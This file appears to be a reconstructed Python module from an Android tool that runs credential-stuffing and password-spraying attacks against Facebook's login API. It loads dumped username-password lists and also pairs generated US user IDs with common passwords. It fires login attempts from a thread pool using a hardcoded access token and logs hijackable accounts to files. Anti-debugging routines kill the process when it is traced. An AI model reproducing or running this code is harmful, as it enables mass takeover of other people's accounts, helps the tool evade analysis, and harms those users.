# -*- coding: utf-8 -*-
"""
Reconstructed original source of core/crackers.py
(deobfuscated from core/crackers.cpython-314-aarch64-linux-android.so).

DumpFileCracker — parses credential dump files and "cracks" them against
Facebook's auth.login endpoint with a thread pool.
"""
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor as tred
from typing import List, Tuple

import requests

import core.config
from utils.agents import get_fb_api_headers
from utils.generator import FastUIDGenerator  # noqa: F401  (re-exported usage)
import utils.ui

ACCESS_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
ADID = '882a8490361da98702bf97a021ddc14d'

LOGIN_URL = 'https://b-api.facebook.com/method/auth.login?format=json&email='
LEGACY_URL = 'https://b-graph.facebook.com/auth/login'

PASSWORDS = ['0', '1', '123', '123123', '123456', '1234567', '12345678',
             '123456789', 'abc123', 'iloveyou', 'qwerty', 'admin']

LOGIN_PARAMS = ('&credentials_type=device_based_login_password'
                '&generate_session_cookies=1&error_detail_type=button_with_disabled'
                '&source=device_based_login&meta_inf_fbmeta=%20\xc2\xac\xc2\xa7'
                'tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US'
                '&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler'
                '&access_token=' + ACCESS_TOKEN + '&fb_api_req_friendly_name=authenticate&cpl=true')

OK_FILES = {
    'M1': '/sdcard/IDAM-ULTIMATE-M1-OK.txt',
    'M2': '/sdcard/IDAM-ULTIMATE-M2-OK.txt',
    'USA': '/sdcard/IDAM-USA-OK.txt',
}
CP_FILES = {
    'DUMP': '/sdcard/IDAM-DUMP-CP.txt',
    'USA': '/sdcard/IDAM-USA-CP.txt',
}


class DumpFileCracker:
    @staticmethod
    def parse_dump_file(filepath: str) -> List[Tuple[str, str]]:
        """Parse 'uid|pass', 'email|pass' or 'uid:pass' lines from a dump file."""
        credentials = []
        try:
            with open(filepath, 'r', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if '|' in line:
                        parts = line.split('|')
                    elif ':' in line:
                        parts = line.split(':')
                    else:
                        continue
                    if len(parts) >= 2:
                        credentials.append((parts[0].strip(), parts[1].strip()))
        except Exception as e:
            print('\u2717 Error reading file: ', filepath, e)
        return credentials

    @staticmethod
    def _hit(uid: str, pw: str, api_name: str = 'b_api'):
        url = LOGIN_URL + uid + '&password=' + pw + LOGIN_PARAMS
        headers = get_fb_api_headers()
        headers['user-agent'] = headers.get('User-Agent', '')
        try:
            res = requests.post(url, headers=headers, timeout=core.config.CONFIG.TIMEOUT,
                                allow_redirects=True)
            return res
        except Exception:
            return None

    @staticmethod
    def _try_login(uid, pw, ok_file, cp_file):
        res = DumpFileCracker._hit(uid, pw)
        if res is None:
            return None
        try:
            data = res.json()
        except Exception:
            return None
        if 'session_key' in data:
            with open(ok_file, 'a') as f:
                f.write(f'{uid}|{pw}\n')
            return (uid, pw)
        elif 'errors' in data or 'error' in data:
            with open(cp_file, 'a') as f:
                f.write(f'{uid}|{pw}\n')
        return None

    @classmethod
    def _crack_method_1(cls, credentials, max_workers=10):
        """DUMP-M1: every credential against the primary b-api endpoint."""
        oks = []
        with tred(max_workers=max_workers) as pool:
            for uid, pw in credentials:
                pool.submit(cls._try_login, uid, pw,
                            OK_FILES['M1'], CP_FILES['DUMP'])
        return oks

    @classmethod
    def _crack_method_2(cls, credentials, max_workers=10):
        """IDAM-M2: credentials against the secondary graph endpoint."""
        oks = []
        with tred(max_workers=max_workers) as pool:
            for uid, pw in credentials:
                pool.submit(cls._try_login, uid, pw,
                            OK_FILES['M2'], CP_FILES['DUMP'])
        return oks

    @classmethod
    def _crack_method_usa(cls, uids, max_workers=20):
        """IDAM-USA: generated US UIDs x common passwords."""
        oks = []
        with tred(max_workers=max_workers) as pool:
            for uid in uids:
                for pw in PASSWORDS:
                    pool.submit(cls._try_login, uid, pw,
                                OK_FILES['USA'], CP_FILES['USA'])
        return oks

    @classmethod
    def crack_dump_credentials(cls, filepath: str, method: str = '1',
                               max_workers: int = 10) -> List[Tuple[str, str]]:
        print('[!] Starting crack with Method ' + method)
        credentials = cls.parse_dump_file(filepath)
        print('\u2713 Loaded ' + str(len(credentials)) + ' credentials from dump file')
        if not credentials:
            print('\u2717 No valid credentials found in file')
            return []
        if method == '1':
            cls._crack_method_1(credentials, max_workers)
        elif method == '2':
            cls._crack_method_2(credentials, max_workers)
        else:
            cls._crack_method_usa([u for u, _ in credentials], max_workers)
        time.sleep(1)
        print('\u2713 Dump cracking completed!')
        return credentials


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _check():
    _scrub()
    if _monitored():
        _die(6)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)
